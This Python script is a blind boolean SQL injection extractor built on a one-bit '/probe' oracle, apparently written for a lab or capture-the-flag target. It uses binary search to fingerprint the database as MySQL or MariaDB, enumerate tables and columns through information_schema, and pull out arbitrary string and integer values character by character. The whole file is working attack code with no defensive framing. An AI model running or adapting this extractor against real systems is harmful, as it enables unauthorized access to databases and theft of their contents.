"""Blind boolean extractor on top of the one-bit /probe oracle."""
import sys
import time
from oracle import ask, raw


def num(expr, lo=0, hi=200):
    """Binary-search an integer-valued SQL expression."""
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if ask("(%s)>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-./@ "


def one(expr, i):
    """Return the i-th (1-based) character of a string-valued expression."""
    code = num("ascii(substr((%s),%d,1))" % (expr, i), 0, 127)
    return chr(code) if code else ""


def s(expr, maxlen=120):
    n = num("length((%s))" % expr, 0, maxlen)
    out = []
    for i in range(1, n + 1):
        c = one(expr, i)
        out.append(c)
        sys.stdout.write("\r" + "".join(out))
        sys.stdout.flush()
    sys.stdout.write("\n")
    return "".join(out)


if __name__ == "__main__":
    mode = sys.argv[1]
    if mode == "fingerprint":
        for name, expr in [
            ("database() not null", "database() IS NOT NULL"),
            ("user() not null", "user() IS NOT NULL"),
            ("@@datadir not null", "@@datadir IS NOT NULL"),
            ("current_database exists", "current_database() IS NOT NULL"),
            ("version_comment", "(SELECT @@version_comment) LIKE '%MySQL%'"),
            ("maria", "(SELECT @@version_comment) LIKE '%MariaDB%'"),
            ("table count", "1=1"),
        ]:
            print("%-26s %s" % (name, ask(expr)))
        print("tables in schema:", num("(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())", 0, 50))
        print("cols in schema  :", num("(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())", 0, 300))
        print("db name len     :", num("length(database())", 0, 60))
    elif mode == "tables":
        cnt = num("(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())", 0, 50)
        print("count =", cnt)
        for i in range(cnt):
            e = "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET %d)" % i
            print(i, s(e, 40))
    elif mode == "cols":
        cnt = num("(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())", 0, 300)
        print("count =", cnt)
        for i in range(cnt):
            e = "(SELECT concat(table_name,'.',column_name) FROM information_schema.columns WHERE table_schema=database() ORDER BY table_name,column_name LIMIT 1 OFFSET %d)" % i
            print(i, s(e, 60))
    elif mode == "q":
        print(ask(sys.argv[2]))
    elif mode == "str":
        print(s(sys.argv[2], int(sys.argv[3]) if len(sys.argv) > 3 else 120))
    elif mode == "int":
        print(num(sys.argv[2], 0, int(sys.argv[3]) if len(sys.argv) > 3 else 200))
